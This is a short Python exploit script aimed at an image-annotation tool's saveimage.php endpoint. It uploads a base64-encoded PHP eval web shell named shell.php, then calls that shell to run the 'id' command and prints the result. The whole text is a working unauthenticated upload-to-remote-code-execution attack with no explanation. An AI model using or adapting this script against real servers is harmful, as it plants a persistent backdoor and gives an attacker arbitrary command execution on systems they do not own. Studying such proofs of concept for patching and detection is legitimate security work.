import requests
url='http://127.0.0.1'
data={'image':'data:image/png;base64,PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==',
      'name':'shell.php',
      'uploadDir':''}
response=requests.post(url+'/annotationTools/php/saveimage.php',data=data)
res=requests.post(url+"/shell.php",data={1:'system("id");'})
print(res.text)